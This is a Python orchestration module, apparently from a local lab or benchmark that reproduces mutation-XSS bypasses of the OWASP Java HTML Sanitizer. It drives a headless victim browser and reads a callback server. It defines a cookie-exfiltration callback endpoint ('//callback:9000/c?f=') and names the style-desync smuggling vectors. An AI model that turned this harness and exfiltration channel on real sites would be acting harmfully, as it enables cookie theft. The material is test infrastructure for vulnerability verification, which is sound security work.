#!/usr/bin/env python3
"""Shared orchestration for the OWASP Java HTML Sanitizer STYLE/noscript mutation-XSS canary
(CVE-2021-42575 -> CVE-2025-66021).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the sanitizer sink page
`/?html=<payload>` on a version, (3) read the callback. The observable result is the callback dump;
the per-run ${PCB_FLAG} appears there IFF the sanitizer's output parsed in the browser into a live
`<script>` that executed (proving execution, not reflection).

Same sink (`PolicyFactory.sanitize(input)` over allowElements(...select,option,noscript,style)
.allowTextIn("style")), same exfil channel for seed and residual; the ONLY difference is the
smuggling vector -- select>style desync (seed, closed by 20211018.2's style CDATA wrapper) vs
noscript>style desync (residual, closed by 20260101.1's tag-stripping) -- and which sanitizer
version (v0/v1/v2) is the guard.
"""
import urllib.parse
import urllib.request

# Host-published ports (oracle / PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:35220",
    "v1": "http://127.0.0.1:35221",
    "v2": "http://127.0.0.1:35222",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:35270"
CALLBACK = "http://127.0.0.1:35290"

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page). The flag rides along as document.cookie.
CB = "//callback:9000/c?f="


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def run_payload(html_payload: str, version: str, mode: str = "load") -> str:
    """Drive the victim to view the sink page with `html_payload` sanitized on `version`, and return
    the callback dump (flag lands there iff the sanitized output parsed into a live <script> that
    executed)."""
    _get(CALLBACK + "/reset")
    q_app = urllib.parse.urlencode({"html": html_payload})
    target = INTERNAL_APP[version] + "/?" + q_app
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": mode}
    )
    _get(VICTIM + "/visit?" + q)
    return _get(CALLBACK + "/dump")


def server_side_render(html_payload: str, version: str) -> str:
    """Return the exact server-side sanitizer output (via /raw) for the repro log."""
    q = urllib.parse.urlencode({"html": html_payload})
    return _get(HOST_APP[version] + "/raw?" + q)

import os as _pcb_os
_pt = _pcb_os.environ.get("PCB_TARGET_PORT")
if _pt and str(_pt).isdigit():
    for _v in HOST_APP:
        HOST_APP[_v] = f"http://127.0.0.1:{int(_pt)}"
_ptv = _pcb_os.environ.get("PCB_VICTIM_PORT")
if _ptv and str(_ptv).isdigit():
    VICTIM = "http://127.0.0.1:" + _ptv
_ptc = _pcb_os.environ.get("PCB_CALLBACK_PORT")
if _ptc and str(_ptc).isdigit():
    CALLBACK = "http://127.0.0.1:" + _ptc
